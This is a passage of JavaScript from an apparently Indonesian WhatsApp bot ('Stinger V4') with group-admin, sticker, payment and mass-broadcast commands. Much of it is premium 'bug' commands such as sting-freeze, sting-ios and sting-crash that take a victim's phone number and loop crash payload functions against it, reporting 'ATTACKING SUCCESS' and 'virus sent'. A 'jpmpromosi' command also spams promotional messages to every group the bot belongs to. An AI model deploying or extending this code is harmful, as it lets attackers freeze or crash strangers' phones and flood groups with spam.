let teks = `${q ? q : ''}\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎ \n`
for (let mem of participants) {
teks += `⊝ @${mem.id.split('@')[0]}\n`
}
zyn.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break

case "sting-kick": {
if (!isGroup) return reply('Only Group')
if (!isAdmins && !isOwner) return reply('Only Admin')
if (!isBotAdmins) return reply(`Bot Bukan Admin :(`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await zyn.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break

case 'closegroup': {
if (!isGroup) return reply(`Khusus Group Bego`)
if (!isAdmins && !isOwner) return reply('Khusus Admin')
if (!isBotAdmins) return reply(`Bot Bukan Admin Bego`)
if (!args[0]) return reply(`*Pilih Waktu:*\n-second\n-minute\n-hour\n-day\n\n*Contoh:*\n${prefix+command}10 second`)
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
}
reply(`*Waktu dimulai dari sekarang*`)
setTimeout(() => {
var nomor = m.participant
zyn.groupSettingUpdate(m.chat, 'announcement')
reply(`Waktu Telah Tiba!\nGrup Ditutup Oleh Bot Dikarenakan Tidak Ada Yg Menjaga Grup\nGrup Akan Dibuka Sesuai Waktu Yg Ditentukan Oleh Admin`)
}, timer)
}
break

case 'opengroup': {
if (!isGroup) return reply(`Khusus Group Bego`)
if (!isAdmins && !isOwner) return reply('Khusus Admin')
if (!isBotAdmins) return reply(`Bot Bukan Admin Bego`)
if (!args[0]) return reply(`*Pilih Waktu:*\n-second\n-minute\n-hour\n-day\n\n*Contoh:*\n${prefix+command}10 second`)
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
}
reply(`*Waktu dimulai dari sekarang*`)
setTimeout(() => {
var nomor = m.participant
zyn.groupSettingUpdate(m.chat, 'not_announcement')
reply(`Tepat Waktu Group Sudah Di Buka Sekarang Semua Peserta Bisa Mengirim Pesan`)
}, timer)
}
break

case "demote": {
if (!isPremium) return reply(mess.only.premium)
if (!isGroup) return reply('Only Group')
if (!isAdmins && !isOwner) return reply('Only Admin')
if (!isBotAdmins) return reply(`Bot Bukan Admin :(`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await zyn.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break

case  'promote': {
if (!q) return reply(`🧊𝐓𝐚𝐠 𝐚 𝐮𝐬𝐞𝐫 𝐭𝐨 𝐏𝐫𝐨𝐦𝐨𝐭𝐞 𝐮𝐬𝐢𝐧𝐠 𝐒𝐭𝐢𝐧𝐠𝐞𝐫 𝐕𝟒🧊`)
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !isGroupOwner && !isCreator) 
return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
let blockwwwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
await zyn.groupParticipantsUpdate(m.chat, [blockwwwww], 'promote').then((res) => reply(json(res))).catch((err) => reply(json(err)))
}
break

case "jpmpromosi": case "jpmpromo": case "jpm3": {
if (!isOwner) return reply(mess.only.owner)
if (!text && !m.quoted) return m.reply("teksnya atau replyteks")
var teks = m.quoted ? m.quoted.text : text
let total = 0
let allfetch = await zyn.groupFetchAllParticipating()
let entrygc = Object.entries(allfetch).slice(0).map((entry)=>entry[1])
let finalres = entrygc.filter(entrygc=>entrygc.announce==false)
let usergc = finalres.map(v=>v.id)
m.reply(`Memproses Mengirim Pesan Ke *${usergc.length} Grup*`)
let teksnya = teks
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/2349037524605\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vaj1vKSK5cDDT4tVvY1y"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"YouTube Owner\",\"url\":\"${linkyt}\",\"merchant_url\":\"https://youtube.com/@esteams\"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Testi Di whatsapp\",\"url\":\"${isLink}\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vaj1vKSK5cDDT4tVvY1y\"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": "{\"display_text\":\"𝐃𝐎𝐍𝐀𝐓𝐄🙏\",\"url\":\"https://i.ibb.co/3mW8Ywz/DONATE.jpg\",\"merchant_url\":\"https://i.ibb.co/3mW8Ywz/DONATE.jpg\"}"
}]
})
})} 
}}, {userJid: m.sender, quoted: m})
for (let jid of usergc) {
try {
await zyn.relayMessage(jid, msgii.message, { 
messageId: msgii.key.id 
})
total += 1
} catch {}
await sleep(global.delayjpm)
}
m.reply(`Berhasil Mengirim Pesan Ke *${total} Grup*`)
}
break

case 'payment': {
let teks = `${monospace("PAYMENT")}

*(E-WALLET)*

   *DANA*
- ${dana}

Harap Setelah Transfer Anda Harus Mengasih Bukti Pembayaran Agar Di Verifikasi Oleh Owner, Tanks For You

© ${storename}`
zyn.sendMessage(from, { 
text: teks,
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[m.sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": false,
"title": `QRIS? KLIK DISINI`,
"body": `Date : ${wib}, ${tanggal}`,
"containsAutoReply": true,
"mediaType": 1, 
"thumbnailUrl": "https://i.ibb.co/3mW8Ywz/DONATE.jpg",
"sourceUrl": `${qris}`
}
}
},{ 
quoted: fkontak })
await sleep(1500)
}
      break

case "danamasuk": {
if (!isOwner) return reply(mess.only.owner)
let teks = `*DONE DANA MASUK*

Reqname :

▰▰▰▰▰▰▰▰
*Garansi 7 Day*
*Create ${wib}*
*Hari Ini ${hariini}*`
zyn.sendMessage(from, { text : teks }, { quoted : m })
}
break

case 'proses':{
m.reply('*SIAP PESANAN ANDA AKAN KAMI PROSES JADI DI MOHON UNTUK MENUNGGU SEBENTAR YA MEK*')
zyn.sendMessage("2349037524605@s.whatsapp.net", { text: "BANG ZYN ADA YANG TRX NIH CEPETAN PROSES NANTI BUYER NGAMOK", contextInfo: { forwardingScore: 9999, isForwarded: true }})
}
break

case 'done': case 'd': {
if (!isOwner) return reply(`Njirr Lu siapa Cuk`)
let s = text.split(',')
let barang = s[0]
let nominal = s[1]
if (s.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} barang,nominal`)
if (!barang) return reply(`Ex : ${prefix+command} barang,nominal\n\nContoh :\n${prefix+command} vipies,60000`)
if (!nominal) return reply(`Ex : ${prefix+command} barang,nominal\n\nContoh :\n${prefix+command} panel,1000`)
text_done = `「 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗕𝗘𝗥𝗛𝗔𝗦𝗜𝗟 」

📦 Barang : ${barang}
💸 Nominal : ${nominal}
📆 Tanggal : ${wib}
🕰️ Waktu : ${time2}
✨ Status : Berhasil

𝗧𝗲𝗿𝗶𝗺𝗮𝗸𝗮𝘀𝗶𝗵 𝗧𝗲𝗹𝗮𝗵 𝗢𝗿𝗱𝗲𝗿 𝗗𝗶 *${storename}*`
await zyn.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: `${nominal}*100000`,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: text_done,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
}
break

case "sticker": 
case "stiker":
case "s": {
if (!isOwner) return reply(mess.only.owner)
if (!quoted) return reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await zyn.sendStimg(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik')
let media = await quoted.download()
let encmedia = await zyn.sendStvid(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
}
}
break

case 'sting-slide': case 'sting-medium': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 50; i++) {
await buk1(zyn, target, "p", 1020000, ptcp = true);
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
}
reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆

    𝐍𝐎𝐓𝐄
> Virus Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker`)
break

case 'stinger-v2': case 'sting-freeze': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 50; i++) {
await buk1(zyn, target, "p", 1020000, ptcp = true);
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
}
reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆

    𝐍𝐎𝐓𝐄
> Virus Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker`)
break

case 'vip': case 'sting-atk': case 'andro': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 30; i++) {
await buk1(zyn, target, "p", 1020000, ptcp = true);
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
}
reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆

    𝐍𝐎𝐓𝐄
> Virus Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker`)
break

case 'sting-ios': case 'iphone': case 'xip':
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 40; i++) {
await buk1(zyn, target, "p", 1020000, ptcp = true);
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
}
reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆

    𝐍𝐎𝐓𝐄
> Virus Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker`)
break

case 'overflow': case 'vasion': case 'sting-crash': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 40; i++) {
await buk1(zyn, target, "p", 1020000, ptcp = true);
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
}
reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆

    𝐍𝐎𝐓𝐄
